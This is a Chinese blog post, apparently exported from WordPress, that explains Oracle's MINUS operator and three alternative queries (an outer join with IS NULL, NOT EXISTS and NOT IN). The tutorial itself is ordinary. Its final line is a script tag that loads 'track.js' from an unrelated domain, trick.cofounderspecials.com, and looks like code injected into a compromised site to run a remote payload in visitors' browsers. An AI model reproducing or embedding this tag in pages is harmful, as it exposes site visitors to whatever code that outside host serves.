---
id: 23
title: 'minus 在oracle中的运用'
date: '2019-11-14T16:04:27+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=23'
permalink: /index.php/2019/11/14/minus-%e5%9c%a8oracle%e4%b8%ad%e7%9a%84%e8%bf%90%e7%94%a8/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Oracle
---

<div>MINUS指令是运用在两个 SQL 语句上。它先找出第一个 SQL 语句所产生的结果，然后看这些结果有没有在第二个 SQL 语句的结果中。如果有的话，那这些结果就被去除，而不会在最后的结果中出现。如果第二个 SQL 语句所产生的结果并没有存在于第一个 SQL 语句所产生的结果内，那这些结果就被抛弃。</div><div>MINUS的语法如下：</div><div>[SQL 语句 1]</div><div>MINUS</div><div>[SQL 语句 2]</div><div></div><div>A minus B就意味着将结果集A去除结果集B中所包含的所有记录后的结果，即在A中存在，而在B中不存在的记录。其算法跟Java中的Collection的removeAll()类似，即A minus B将只去除A跟B的交集部分，对于B中存在而A中不存在的记录不会做任何操作，也不会抛出异常。</div><div><div>与MINUS功能类似的有</div><div>第一个</div><div>SELECT <wbr></wbr> 表1.* <wbr></wbr> <wbr></wbr></div><div>FROM <wbr></wbr> <wbr></wbr> 表1, <wbr></wbr> 表2</div><div>WHERE <wbr></wbr> <wbr></wbr>表1.主键=表2.主键(+) <wbr></wbr></div><div>AND <wbr></wbr> 表2.主键 <wbr></wbr> IS <wbr></wbr> NULL;</div><div>第二个</div><div>select <wbr></wbr> * <wbr></wbr> from <wbr></wbr> 表1 <wbr></wbr> where <wbr></wbr>not <wbr></wbr> exists(select <wbr></wbr> 1 <wbr></wbr> from <wbr></wbr> 表2 <wbr></wbr>where <wbr></wbr> 表1.主键=表2.主键);</div><div>第三个</div><div>select <wbr></wbr> * <wbr></wbr> from <wbr></wbr> 表1 <wbr></wbr> where <wbr></wbr>表1.主键 not <wbr></wbr> in (select <wbr></wbr>主键 <wbr></wbr> from <wbr></wbr> 表2);</div><div>当然效率较高的还是MINUS。</div></div><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>